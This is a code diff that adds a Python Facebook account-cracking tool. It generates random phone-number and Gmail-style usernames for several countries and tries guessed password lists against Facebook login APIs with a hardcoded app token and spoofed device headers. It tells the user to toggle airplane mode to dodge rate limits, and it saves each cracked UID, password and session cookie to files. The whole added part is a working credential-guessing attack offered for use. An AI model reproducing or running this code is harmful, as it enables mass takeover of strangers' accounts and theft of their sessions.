-        return None
-    if None == '6' or choice == '06':
-        react_reels()
-        return None
-    if None == '7' or choice == '07':
-        follow()
-        return None
-    if None == '8' or choice == '08':
-        auto_comment()
-        return None
-    if None == '9' or choice == '09':
-        auto_comment_to_reels()
-        return None
-    if None == '10':
-        auto_comment_to_dp()
-        return None
-    if None == '11':
-        reply_to_comment()
-        return None
-    if None == '12':
-        auto_share()
-        return None
-    if None == '13':
-        g_join()
-        return None
-    if None == '14':
-        p_like()
-        return None
-    if None == '15':
-        store()
-        return None
-    if None == '16':
-        delete_files()
-        return None
-    if None == '17':
-        print(f'''\n{red}  Byeeeeers!''')
-        return None
-    print(f'''{red}  Invalid choice.''')
-
-if __name__ == '__main__':
-    get_facebook_pages()
+    print(f'{A}|=| EXAMPLE : 9815 / 9840 / 9814 ');linex();code=input(f'{A}|?| CHOICE  : ')
+    clear()
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    try:
+        limit=int(input(f'{A}|?| CHOICE  : '))
+    except ValueError:
+        limit=50000
+    clear()
+    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    for nmbr in range(limit):
+        nmp = "". join(random.choice(string.digits) for _ in range(6))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as Asifx:
+        clear()
+        tl=str(len(user))
+        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for love in user:
+            ids=code+love
+            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
+            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ RANDOM-PAKISTAN }──────────────#
+def __pakistan__():
+    user=[]
+    clear()
+    print(f'{A}|=| EXAMPLE : 0306 / 0315 / 0345 ');linex();code=input(f'{A}|?| CHOICE  : ')
+    clear()
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    try:
+        limit=int(input(f'{A}|?| CHOICE  : '))
+    except ValueError:
+        limit=50000
+    clear()
+    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    for nmbr in range(limit):
+        nmp = "". join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as Asifx:
+        clear()
+        tl=str(len(user))
+        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for love in user:
+            ids=code+love
+            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
+            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ RANDOM-AFGHANISTAN }──────────────#
+def __afghanistanx__():
+    user=[]
+    clear()
+    print(f'{A}|=| EXAMPLE : +9340 / +9350 / +9330 ');linex();code=input(f'{A}|?| CHOICE  : ')
+    clear()
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    try:
+        limit=int(input(f'{A}|?| CHOICE  : '))
+    except ValueError:
+        limit=50000
+    clear()
+    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    for nmbr in range(limit):
+        nmp = "". join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as Asifx:
+        clear()
+        tl=str(len(user))
+        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for love in user:
+            ids=code+love
+            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ GMAIL }──────────────#
+def __Gmailx__():
+    clear()
+    user=[]
+    print(f"{A}|=| EXAMPLE : Habib/Shakib/Rakib/Sumon ");linex();first = input(f'{A}|?| FIRST NAME  : ')
+    clear()
+    print(f"{A}|=| EXAMPLE : Hossain/Khan/Ali/Islam ");linex();last = input(f'{A}|?| LAST NAME  : ')
+    period = '.'
+    try:
+        clear();print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+        limit=int(input(f'{A}|?| CHOICE  : '))
+    except ValueError:
+        limit=5000
+    for nmbr in range(limit):
+        nmp="".join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as Asifxxxx:
+        total=str(len(user))
+        clear()
+        print(f'{A}|=| GMAIL UID : {total} ');print(f'{A}|=| FULL NAME : {first+last} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for digitx in user:
+            username=first+period+last+digitx
+            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
+            Asifxxxx.submit(__GMAILX__,username,pswrd,total)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ RANDOM-METHOD-M1 }──────────────#
+def __Randm_M1__(ids,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        random_seed = random.Random()
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                        headers = {'User-Agent': fuckx(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        url = 'https://graph.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                uid = po['uid']
+                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
+                                print(f'\r\r\x1b[38;5;46m|A x N_OK| {str(uid)} | {pas} ')
+                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
+                                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                oks.append(str(uid))
+                                break
+                        elif 'www.facebook.com' in po['error']['message']: 
+                                uid = po['error']['error_data']['uid']
+                                print(f'\r\r{R}|A x N_CP| {str(uid)} | {pas} ')
+                                open('/sdcard/ASIF-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                cps.append(str(uid))
+                                break
+                        else:continue
+                loop+=1
+        except:pass
+#──────────────{ RANDOM-METHOD-M2 }──────────────#
+def __Randm_M2__(ids,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        random_seed = random.Random()
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                        headers = {'User-Agent': randBuildLSB(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        url = 'https://api.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                uid = po['uid']
+                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
+                                print(f'\r\r\x1b[38;5;46m|A x N_OK| {str(uid)} | {pas} ')
+                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
+                                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                oks.append(str(uid))
+                                break
+                        elif 'www.facebook.com' in po['error']['message']: 
+                                uid = po['error']['error_data']['uid']
+                                print(f'\r\r{R}|A x N_CP| {str(uid)} | {pas} ')
+                                open('/sdcard/ASIF-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                cps.append(str(uid))
+                                break
+                        else:continue
+                loop+=1
+        except:pass
+#──────────────{ RANDOM-METHOD-M3 }──────────────#
+def __Randm_M3__(ids,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        random_seed = random.Random()
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+                        headers = {'User-Agent':pro(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                uid = po['uid']
+                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
+                                print(f'\r\r\x1b[38;5;46m|A x N_OK| {str(uid)} | {pas} ')
+                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
+                                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                oks.append(str(uid))
+                                break
+                        elif 'www.facebook.com' in po['error']['message']: 
+                                uid = po['error']['error_data']['uid']
+                                print(f'\r\r{R}|A x N_CP| {str(uid)} | {pas} ')
+                                open('/sdcard/ASIF-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                cps.append(str(uid))
+                                break
+                        else:continue
+                loop+=1
+        except:pass
+#──────────────{ RANDOM-METHOD-M4 }──────────────#
+def __Randm_M4__(ids,passlist):
+    global oks,cps,loop
+    try:
+        for pas in passlist:
+            session=requests.Session()
+            sys.stdout.write(f'\r\r{A}|ASIF-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "pass":pas,
+            "login":"Log In"}
+            pron_star={'authority': 'd.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                ids = re.findall('c_user=(.*);xs', coki)[0]
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| {ids} | {pas} ')
+                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
+                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
+                oks.append(ids)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                ids = "1000"+coki1[0:11]
+                print(f'\r\r{R}|A x N_OK| {ids} | {pas} ')
+                open('/sdcard/ASIF-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#──────────────{ RANDOM-METHOD-M5 }──────────────#
+def __Randm_M5__(ids,passlist):
+    global oks,cps,loop
+    try:
+        for pas in passlist:
+            session=requests.Session()
+            sys.stdout.write(f'\r\r{A}|ASIF-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "pass":pas,
+            "login":"Log In"}
+            pron_star={'authority': 'x.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                ids = re.findall('c_user=(.*);xs', coki)[0]
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| {ids} | {pas} ')
+                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
+                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
+                oks.append(ids)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                ids = "1000"+coki1[0:11]
+                print(f'\r\r{R}|A x N_OK| {ids} | {pas} ')
+                open('/sdcard/ASIF-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#──────────────{ GMAIL-METHOD }──────────────#
+def __GMAILX__(username,pswrd,total):
+    global oks,cps,loop
+    sys.stdout.write(f'\r\r{A}|ASIF-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+    try:
+        for password in pswrd:
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            connection={'adid': adid,'format': 'json','device_id': device_id,'email': username,'password': password, 'generate_analytics_claims': '1','credentials_type': 'password','source': 'login', 'error_detail_type': 'button_with_disabled','enroll_misauth': 'false', 'generate_session_cookies': '1','generate_machine_id': '1','meta_inf_fbmeta': '', 'currently_logged_in_userid': '0','fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': randBuildLSB(), 'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793','X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            login_url='https://api.facebook.com/method/auth.login'
+            req=httpx.post(login_url,data=connection,headers=header).json()
+            if 'session_key' in req:
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+username+' | '+password)
+                open('/sdcard/ASIF-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
+                oks.append(username)
+                break
+            elif 'www.facebook.com' in req['error_msg']:
+                print(f'\r\r{R}|A x N_CP| '+username+' | '+password)
+                open('/sdcard/ASIF-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
+                cps.append(username)
+                break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        	time.sleep(20)   
+    except exceptions:
+        pass
+#──────────────{ END }──────────────#
+menu()
